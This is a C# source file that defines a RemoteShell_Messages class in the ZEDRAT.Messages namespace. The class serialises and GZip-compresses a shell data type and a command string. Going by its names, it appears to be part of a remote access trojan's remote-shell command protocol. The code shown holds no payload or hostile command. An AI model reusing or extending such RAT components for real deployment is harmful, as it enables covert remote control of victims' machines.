using System.IO;
using ZEDRAT.Algorithm;

namespace ZEDRAT.Messages
{
	public class RemoteShell_Messages
	{
		public string _ShellDataType;

		public string _Command;

		public RemoteShell_Messages()
		{
		}

		public RemoteShell_Messages(string ShellDataType, string Command)
		{
			this._ShellDataType = ShellDataType;
			this._Command = Command;
		}

		public static byte[] ClassToByte(object ob)
		{
			RemoteShell_Messages remoteShell_Messages = (RemoteShell_Messages)ob;
			using MemoryStream memoryStream = new MemoryStream();
			using BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
			binaryWriter.Write(remoteShell_Messages._ShellDataType);
			binaryWriter.Write(remoteShell_Messages._Command);
			return GZip.Compress(memoryStream.ToArray());
		}

		public static RemoteShell_Messages ByteToClass(byte[] b)
		{
			byte[] buffer = GZip.Decompress(b);
			RemoteShell_Messages remoteShell_Messages = new RemoteShell_Messages();
			using MemoryStream input = new MemoryStream(buffer);
			using BinaryReader binaryReader = new BinaryReader(input);
			remoteShell_Messages._ShellDataType = binaryReader.ReadString();
			remoteShell_Messages._Command = binaryReader.ReadString();
			return remoteShell_Messages;
		}
	}
}
